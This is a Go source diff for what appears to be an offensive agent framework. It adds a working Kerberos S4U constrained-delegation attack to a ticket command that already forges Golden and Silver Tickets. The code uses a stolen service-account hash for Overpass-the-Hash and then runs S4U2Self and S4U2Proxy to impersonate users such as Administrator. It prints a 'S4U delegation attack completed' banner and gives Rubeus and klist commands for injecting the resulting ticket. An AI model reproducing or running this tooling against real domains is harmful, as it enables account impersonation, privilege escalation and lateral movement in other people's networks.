@@ -1,6 +1,8 @@
 package commands
 
 import (
+	"crypto/hmac"
+	"crypto/md5"
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
@@ -20,6 +22,7 @@ import (
 	"github.com/jcmturner/gokrb5/v8/crypto"
 	"github.com/jcmturner/gokrb5/v8/iana"
 	"github.com/jcmturner/gokrb5/v8/iana/asnAppTag"
+	"github.com/jcmturner/gokrb5/v8/iana/flags"
 	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
 	"github.com/jcmturner/gokrb5/v8/iana/nametype"
 	"github.com/jcmturner/gokrb5/v8/messages"
@@ -34,18 +37,19 @@ func (c *TicketCommand) Description() string {
 }
 
 type ticketArgs struct {
-	Action    string `json:"action"`     // forge, request
-	Realm     string `json:"realm"`      // domain (e.g., CORP.LOCAL)
-	Username  string `json:"username"`   // target identity (e.g., Administrator)
-	UserRID   int    `json:"user_rid"`   // RID (default: 500 for Administrator)
-	DomainSID string `json:"domain_sid"` // domain SID (e.g., S-1-5-21-...)
-	Key       string `json:"key"`        // hex AES256 or NT hash key
-	KeyType   string `json:"key_type"`   // aes256, aes128, rc4 (default: aes256)
-	KVNO      int    `json:"kvno"`       // key version number (default: 2)
-	Lifetime  int    `json:"lifetime"`   // ticket lifetime in hours (default: 24)
-	Format    string `json:"format"`     // kirbi, ccache (default: kirbi)
-	SPN       string `json:"spn"`        // for Silver Ticket: service/host
-	Server    string `json:"server"`     // KDC address for request action (e.g., dc01.corp.local)
+	Action      string `json:"action"`       // forge, request, s4u
+	Realm       string `json:"realm"`        // domain (e.g., CORP.LOCAL)
+	Username    string `json:"username"`     // target identity (e.g., Administrator)
+	UserRID     int    `json:"user_rid"`     // RID (default: 500 for Administrator)
+	DomainSID   string `json:"domain_sid"`   // domain SID (e.g., S-1-5-21-...)
+	Key         string `json:"key"`          // hex AES256 or NT hash key
+	KeyType     string `json:"key_type"`     // aes256, aes128, rc4 (default: aes256)
+	KVNO        int    `json:"kvno"`         // key version number (default: 2)
+	Lifetime    int    `json:"lifetime"`     // ticket lifetime in hours (default: 24)
+	Format      string `json:"format"`       // kirbi, ccache (default: kirbi)
+	SPN         string `json:"spn"`          // Silver Ticket: service/host, or S4U2Proxy: target SPN
+	Server      string `json:"server"`       // KDC address for request/s4u action
+	Impersonate string `json:"impersonate"`  // S4U: user to impersonate (e.g., Administrator)
 }
 
 func (c *TicketCommand) Execute(task structs.Task) structs.CommandResult {
@@ -71,9 +75,11 @@ func (c *TicketCommand) Execute(task structs.Task) structs.CommandResult {
 		return ticketForge(args)
 	case "request":
 		return ticketRequest(args)
+	case "s4u":
+		return ticketS4U(args)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: forge, request", args.Action),
+			Output:    fmt.Sprintf("Unknown action: %s. Use: forge, request, s4u", args.Action),
 			Status:    "error",
 			Completed: true,
 		}
@@ -814,6 +820,507 @@ func ticketKrbErrorMsg(code int32) string {
 	default:
 		return fmt.Sprintf("Kerberos error code %d", code)
 	}
+}
+
+// ticketS4U performs S4U2Self + S4U2Proxy to obtain a service ticket for an impersonated
+// user via constrained delegation. Uses a service account's key to get a TGT, then
+// S4U2Self for impersonation, then S4U2Proxy to access the target SPN. (T1134.001)
+func ticketS4U(args ticketArgs) structs.CommandResult {
+	if args.Realm == "" || args.Username == "" || args.Key == "" || args.Server == "" || args.Impersonate == "" || args.SPN == "" {
+		return structs.CommandResult{
+			Output:    "Error: realm, username (service account), key, server (KDC), impersonate (target user), and spn (target service) are required for s4u",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	realm := strings.ToUpper(args.Realm)
+	if args.Format == "" {
+		args.Format = "kirbi"
+	}
+	if args.KeyType == "" {
+		args.KeyType = "aes256"
+	}
+
+	// Parse service account key
+	keyBytes, err := hex.DecodeString(args.Key)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error decoding key hex: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	etypeID, etypeCfgName, errResult := ticketParseKeyType(args.KeyType, keyBytes)
+	if errResult != nil {
+		return *errResult
+	}
+
+	userKey := types.EncryptionKey{
+		KeyType:  etypeID,
+		KeyValue: keyBytes,
+	}
+
+	// Resolve KDC address
+	kdcAddr := args.Server
+	if !strings.Contains(kdcAddr, ":") {
+		kdcAddr += ":88"
+	}
+
+	// Step 1: Get TGT for service account via OPtH
+	tgt, sessionKey, err := ticketOPtH(args.Username, realm, etypeID, etypeCfgName, userKey, kdcAddr)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error obtaining TGT for %s: %v", args.Username, err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Step 2: S4U2Self — request TGS for impersonated user to service account
+	s4uSelfTicket, s4uSelfSessionKey, err := ticketS4U2Self(args.Username, args.Impersonate, realm, etypeID, etypeCfgName, tgt, sessionKey, kdcAddr)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error in S4U2Self: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Step 3: S4U2Proxy — use S4U2Self ticket to get TGS for target service
+	s4uProxyTicket, s4uProxyDecPart, err := ticketS4U2Proxy(args.Username, args.SPN, realm, etypeID, etypeCfgName, tgt, sessionKey, s4uSelfTicket, kdcAddr)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error in S4U2Proxy: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Export as kirbi or ccache
+	proxySessionKey := s4uProxyDecPart.Key
+	proxyFlags := s4uProxyDecPart.Flags
+	authTime := s4uProxyDecPart.AuthTime
+	endTime := s4uProxyDecPart.EndTime
+	renewTill := s4uProxyDecPart.RenewTill
+
+	// Parse target SPN into PrincipalName
+	spnParts := strings.SplitN(args.SPN, "/", 2)
+	targetSName := types.PrincipalName{
+		NameType:   nametype.KRB_NT_SRV_INST,
+		NameString: spnParts,
+	}
+
+	var output string
+	switch strings.ToLower(args.Format) {
+	case "kirbi":
+		kirbiBytes, err := ticketToKirbi(s4uProxyTicket, proxySessionKey, args.Impersonate, realm, targetSName, proxyFlags, authTime, endTime, renewTill)
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error creating kirbi: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		output = ticketS4UFormatOutput(args, realm, s4uSelfSessionKey, proxySessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
+	case "ccache":
+		ticketBytes, err := s4uProxyTicket.Marshal()
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error marshaling ticket: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		ccacheBytes := ticketToCCache(ticketBytes, proxySessionKey, args.Impersonate, realm, targetSName, proxyFlags, authTime, endTime, renewTill)
+		output = ticketS4UFormatOutput(args, realm, s4uSelfSessionKey, proxySessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
+	default:
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: unknown format %q. Use: kirbi, ccache", args.Format),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	return structs.CommandResult{
+		Output:    output,
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+// ticketParseKeyType validates key type and length, returns etype ID and config name.
+func ticketParseKeyType(keyType string, keyBytes []byte) (int32, string, *structs.CommandResult) {
+	switch strings.ToLower(keyType) {
+	case "aes256":
+		if len(keyBytes) != 32 {
+			return 0, "", &structs.CommandResult{
+				Output:    fmt.Sprintf("Error: AES256 key must be 32 bytes, got %d", len(keyBytes)),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		return 18, "aes256-cts-hmac-sha1-96", nil
+	case "aes128":
+		if len(keyBytes) != 16 {
+			return 0, "", &structs.CommandResult{
+				Output:    fmt.Sprintf("Error: AES128 key must be 16 bytes, got %d", len(keyBytes)),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		return 17, "aes128-cts-hmac-sha1-96", nil
+	case "rc4", "ntlm":
+		if len(keyBytes) != 16 {
+			return 0, "", &structs.CommandResult{
+				Output:    fmt.Sprintf("Error: RC4/NTLM key must be 16 bytes, got %d", len(keyBytes)),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		return 23, "rc4-hmac", nil
+	default:
+		return 0, "", &structs.CommandResult{
+			Output:    fmt.Sprintf("Error: unknown key_type %q. Use: aes256, aes128, rc4", keyType),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+}
+
+// ticketOPtH performs Overpass-the-Hash to get a TGT, returning the ticket and session key.
+func ticketOPtH(username, realm string, etypeID int32, etypeCfgName string, userKey types.EncryptionKey, kdcAddr string) (messages.Ticket, types.EncryptionKey, error) {
+	cfgStr := fmt.Sprintf("[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n  default_tkt_enctypes = %s\n  default_tgs_enctypes = %s\n  forwardable = true\n[realms]\n  %s = {\n    kdc = %s\n  }\n",
+		realm, etypeCfgName, etypeCfgName, realm, kdcAddr)
+	cfg, err := config.NewFromString(cfgStr)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("config: %v", err)
+	}
+
+	cname := types.PrincipalName{
+		NameType:   nametype.KRB_NT_PRINCIPAL,
+		NameString: []string{username},
+	}
+	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("AS-REQ: %v", err)
+	}
+	asReq.ReqBody.EType = []int32{etypeID}
+
+	// PA-ENC-TIMESTAMP
+	paTS := types.PAEncTSEnc{PATimestamp: time.Now().UTC()}
+	paTSBytes, err := asn1.Marshal(paTS)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("PA-ENC-TIMESTAMP marshal: %v", err)
+	}
+	encTS, err := crypto.GetEncryptedData(paTSBytes, userKey, keyusage.AS_REQ_PA_ENC_TIMESTAMP, 0)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("PA-ENC-TIMESTAMP encrypt: %v", err)
+	}
+	encTSBytes, err := asn1.Marshal(encTS)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("PA-ENC-TIMESTAMP bytes: %v", err)
+	}
+	asReq.PAData = types.PADataSequence{
+		{PADataType: 2, PADataValue: encTSBytes},
+	}
+
+	// Send AS-REQ
+	respBuf, err := ticketKDCSend(asReq.Marshal, kdcAddr)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, err
+	}
+
+	// Check for KRB-ERROR
+	if len(respBuf) > 0 && respBuf[0] == 0x7e {
+		return messages.Ticket{}, types.EncryptionKey{}, ticketParseKRBError(respBuf)
+	}
+
+	// Parse AS-REP
+	var asRep messages.ASRep
+	if err := asRep.Unmarshal(respBuf); err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("AS-REP parse: %v", err)
+	}
+
+	plainBytes, err := crypto.DecryptEncPart(asRep.EncPart, userKey, 3)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("AS-REP decrypt: %v", err)
+	}
+	var decPart messages.EncKDCRepPart
+	if err := decPart.Unmarshal(plainBytes); err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("AS-REP EncPart parse: %v", err)
+	}
+
+	return asRep.Ticket, decPart.Key, nil
+}
+
+// ticketKDCSend marshals a message, sends it to the KDC over TCP, and returns the response.
+func ticketKDCSend(marshalFn func() ([]byte, error), kdcAddr string) ([]byte, error) {
+	reqBytes, err := marshalFn()
+	if err != nil {
+		return nil, fmt.Errorf("marshal: %v", err)
+	}
+
+	conn, err := net.DialTimeout("tcp", kdcAddr, 10*time.Second)
+	if err != nil {
+		return nil, fmt.Errorf("connect to KDC %s: %v", kdcAddr, err)
+	}
+	defer conn.Close()
+	_ = conn.SetDeadline(time.Now().Add(15 * time.Second))
+
+	// TCP Kerberos framing: 4-byte length prefix
+	lenBuf := make([]byte, 4)
+	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
+	if _, err := conn.Write(lenBuf); err != nil {
+		return nil, fmt.Errorf("send length: %v", err)
+	}
+	if _, err := conn.Write(reqBytes); err != nil {
+		return nil, fmt.Errorf("send data: %v", err)
+	}
+
+	if _, err := io.ReadFull(conn, lenBuf); err != nil {
+		return nil, fmt.Errorf("read response length: %v", err)
+	}
+	respLen := binary.BigEndian.Uint32(lenBuf)
+	if respLen > 1048576 {
+		return nil, fmt.Errorf("response too large (%d bytes)", respLen)
+	}
+	respBuf := make([]byte, respLen)
+	if _, err := io.ReadFull(conn, respBuf); err != nil {
+		return nil, fmt.Errorf("read response: %v", err)
+	}
+
+	return respBuf, nil
+}
+
+// ticketParseKRBError parses a KRB-ERROR response buffer into a human-readable error.
+func ticketParseKRBError(buf []byte) error {
+	var krbErr messages.KRBError
+	if err := krbErr.Unmarshal(buf); err != nil {
+		return fmt.Errorf("KDC returned error (unparseable)")
+	}
+	errMsg := ticketKrbErrorMsg(krbErr.ErrorCode)
+	if krbErr.EText != "" {
+		errMsg += ": " + krbErr.EText
+	}
+	return fmt.Errorf("KDC error: %s (code %d)", errMsg, krbErr.ErrorCode)
+}
+
+// ticketS4U2Self performs S4U2Self: requests a TGS for an impersonated user to the
+// service account itself. Returns the S4U2Self ticket and its session key.
+func ticketS4U2Self(serviceUser, targetUser, realm string, etypeID int32, etypeCfgName string, tgt messages.Ticket, sessionKey types.EncryptionKey, kdcAddr string) (messages.Ticket, types.EncryptionKey, error) {
+	cfgStr := fmt.Sprintf("[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n  default_tkt_enctypes = %s\n  default_tgs_enctypes = %s\n  forwardable = true\n[realms]\n  %s = {\n    kdc = %s\n  }\n",
+		realm, etypeCfgName, etypeCfgName, realm, kdcAddr)
+	cfg, err := config.NewFromString(cfgStr)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("config: %v", err)
+	}
+
+	// Build TGS-REQ for S4U2Self: SName = service account itself
+	cname := types.PrincipalName{
+		NameType:   nametype.KRB_NT_PRINCIPAL,
+		NameString: []string{serviceUser},
+	}
+	sname := types.PrincipalName{
+		NameType:   nametype.KRB_NT_PRINCIPAL,
+		NameString: []string{serviceUser},
+	}
+	tgsReq, err := messages.NewTGSReq(cname, realm, cfg, tgt, sessionKey, sname, false)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("TGS-REQ build: %v", err)
+	}
+
+	// Set Forwardable flag
+	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Forwardable)
+
+	// Build PA-FOR-USER padata for S4U2Self
+	paForUser, err := ticketBuildPAForUser(targetUser, realm, sessionKey)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("PA-FOR-USER: %v", err)
+	}
+	tgsReq.PAData = append(tgsReq.PAData, paForUser)
+
+	// Send TGS-REQ
+	respBuf, err := ticketKDCSend(tgsReq.Marshal, kdcAddr)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, err
+	}
+
+	if len(respBuf) > 0 && respBuf[0] == 0x7e {
+		return messages.Ticket{}, types.EncryptionKey{}, ticketParseKRBError(respBuf)
+	}
+
+	// Parse TGS-REP
+	var tgsRep messages.TGSRep
+	if err := tgsRep.Unmarshal(respBuf); err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("TGS-REP parse: %v", err)
+	}
+
+	// Decrypt TGS-REP EncPart using TGT session key (key usage 8)
+	plainBytes, err := crypto.DecryptEncPart(tgsRep.EncPart, sessionKey, keyusage.TGS_REP_ENCPART_SESSION_KEY)
+	if err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("TGS-REP decrypt: %v", err)
+	}
+	var decPart messages.EncKDCRepPart
+	if err := decPart.Unmarshal(plainBytes); err != nil {
+		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("TGS-REP EncPart parse: %v", err)
+	}
+
+	return tgsRep.Ticket, decPart.Key, nil
+}
+
+// ticketS4U2Proxy performs S4U2Proxy: uses the S4U2Self ticket to request a TGS
+// for the target service on behalf of the impersonated user.
+func ticketS4U2Proxy(serviceUser, targetSPN, realm string, etypeID int32, etypeCfgName string, tgt messages.Ticket, sessionKey types.EncryptionKey, s4uSelfTicket messages.Ticket, kdcAddr string) (messages.Ticket, messages.EncKDCRepPart, error) {
+	cfgStr := fmt.Sprintf("[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n  default_tkt_enctypes = %s\n  default_tgs_enctypes = %s\n  forwardable = true\n[realms]\n  %s = {\n    kdc = %s\n  }\n",
+		realm, etypeCfgName, etypeCfgName, realm, kdcAddr)
+	cfg, err := config.NewFromString(cfgStr)
+	if err != nil {
+		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("config: %v", err)
+	}
+
+	// Parse target SPN into PrincipalName
+	spnParts := strings.SplitN(targetSPN, "/", 2)
+	targetSName := types.PrincipalName{
+		NameType:   nametype.KRB_NT_SRV_INST,
+		NameString: spnParts,
+	}
+
+	cname := types.PrincipalName{
+		NameType:   nametype.KRB_NT_PRINCIPAL,
+		NameString: []string{serviceUser},
+	}
+
+	tgsReq, err := messages.NewTGSReq(cname, realm, cfg, tgt, sessionKey, targetSName, false)
+	if err != nil {
+		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("TGS-REQ build: %v", err)
+	}
+
+	// Set KDC options for S4U2Proxy
+	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Forwardable)
+	// cname-in-addl-tkt (bit 14) tells the KDC to use the cname from AdditionalTickets
+	types.SetFlag(&tgsReq.ReqBody.KDCOptions, 14)
+
+	// Add S4U2Self ticket as additional ticket
+	tgsReq.ReqBody.AdditionalTickets = []messages.Ticket{s4uSelfTicket}
+
+	// Send TGS-REQ
+	respBuf, err := ticketKDCSend(tgsReq.Marshal, kdcAddr)
+	if err != nil {
+		return messages.Ticket{}, messages.EncKDCRepPart{}, err
+	}
+
+	if len(respBuf) > 0 && respBuf[0] == 0x7e {
+		return messages.Ticket{}, messages.EncKDCRepPart{}, ticketParseKRBError(respBuf)
+	}
+
+	// Parse TGS-REP
+	var tgsRep messages.TGSRep
+	if err := tgsRep.Unmarshal(respBuf); err != nil {
+		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("TGS-REP parse: %v", err)
+	}
+
+	// Decrypt TGS-REP using TGT session key (key usage 8)
+	plainBytes, err := crypto.DecryptEncPart(tgsRep.EncPart, sessionKey, keyusage.TGS_REP_ENCPART_SESSION_KEY)
+	if err != nil {
+		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("TGS-REP decrypt: %v", err)
+	}
+	var decPart messages.EncKDCRepPart
+	if err := decPart.Unmarshal(plainBytes); err != nil {
+		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("TGS-REP EncPart parse: %v", err)
+	}
+
+	return tgsRep.Ticket, decPart, nil
+}
+
+// ticketBuildPAForUser constructs the PA-FOR-USER padata for S4U2Self.
+// Per MS-SFU 2.2.1: PA-FOR-USER contains userName, userRealm, cksum, auth-package.
+func ticketBuildPAForUser(targetUser, realm string, sessionKey types.EncryptionKey) (types.PAData, error) {
+	// PA-FOR-USER structure (MS-SFU 2.2.1):
+	// userName[0]: PrincipalName
+	// userRealm[1]: Realm (string)
+	// cksum[2]: Checksum
+	// auth-package[3]: KerberosString = "Kerberos"
+
+	targetCName := types.PrincipalName{
+		NameType:   nametype.KRB_NT_ENTERPRISE,
+		NameString: []string{targetUser},
+	}
+
+	// Compute HMAC-MD5 checksum over (nameType + nameString + realm + "Kerberos")
+	// Using session key, per MS-SFU 2.2.1
+	var checksumData []byte
+	// Name type (4 bytes, little-endian)
+	ntBuf := make([]byte, 4)
+	binary.LittleEndian.PutUint32(ntBuf, uint32(targetCName.NameType))
+	checksumData = append(checksumData, ntBuf...)
+	// Each name component (UTF-8 bytes)
+	for _, s := range targetCName.NameString {
+		checksumData = append(checksumData, []byte(s)...)
+	}
+	// Realm (UTF-8 bytes)
+	checksumData = append(checksumData, []byte(realm)...)
+	// Auth-package: "Kerberos"
+	checksumData = append(checksumData, []byte("Kerberos")...)
+
+	// HMAC-MD5 with session key value
+	mac := hmac.New(md5.New, sessionKey.KeyValue)
+	mac.Write(checksumData)
+	cksumValue := mac.Sum(nil)
+
+	cksum := types.Checksum{
+		CksumType: -138, // HMAC-MD5 (checksum type for PA-FOR-USER per MS-SFU)
+		Checksum:  cksumValue,
+	}
+
+	// ASN.1 encode PA-FOR-USER
+	type paForUserASN1 struct {
+		UserName    types.PrincipalName `asn1:"explicit,tag:0"`
+		UserRealm   string              `asn1:"generalstring,explicit,tag:1"`
+		Cksum       types.Checksum      `asn1:"explicit,tag:2"`
+		AuthPackage string              `asn1:"generalstring,explicit,tag:3"`
+	}
+
+	pafu := paForUserASN1{
+		UserName:    targetCName,
+		UserRealm:   realm,
+		Cksum:       cksum,
+		AuthPackage: "Kerberos",
+	}
+
+	pafuBytes, err := asn1.Marshal(pafu)
+	if err != nil {
+		return types.PAData{}, fmt.Errorf("marshal PA-FOR-USER: %v", err)
+	}
+
+	return types.PAData{
+		PADataType:  129, // PA_FOR_USER
+		PADataValue: pafuBytes,
+	}, nil
+}
+
+func ticketS4UFormatOutput(args ticketArgs, realm string, selfSessionKey, proxySessionKey types.EncryptionKey, start, end time.Time, b64 string) string {
+	var sb strings.Builder
+	sb.WriteString("[*] S4U delegation attack completed\n")
+	sb.WriteString(fmt.Sprintf("    Service Account: %s@%s\n", args.Username, realm))
+	sb.WriteString(fmt.Sprintf("    Impersonated:    %s@%s\n", args.Impersonate, realm))
+	sb.WriteString(fmt.Sprintf("    Target SPN:      %s\n", args.SPN))
+	sb.WriteString(fmt.Sprintf("    KDC:             %s\n", args.Server))
+	sb.WriteString(fmt.Sprintf("    Key Type:        %s (etype %d)\n", args.KeyType, proxySessionKey.KeyType))
+	sb.WriteString(fmt.Sprintf("    Valid:           %s — %s\n", start.Format("2006-01-02 15:04:05 UTC"), end.Format("2006-01-02 15:04:05 UTC")))
+	sb.WriteString(fmt.Sprintf("    Format:          %s\n", args.Format))
+	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket (for %s as %s):\n%s\n", args.Format, args.SPN, args.Impersonate, b64))
+
+	if args.Format == "kirbi" {
+		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
+		sb.WriteString("[*] Or:     Rubeus.exe ptt /ticket:<base64>\n")
+	} else {
+		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
+		sb.WriteString("[*] Or:     echo '<base64>' | base64 -d > /tmp/krb5cc && export KRB5CCNAME=/tmp/krb5cc\n")
+	}
+
+	return sb.String()
 }
 
 func ccacheWritePrincipal(buf []byte, realm string, components []string) []byte {
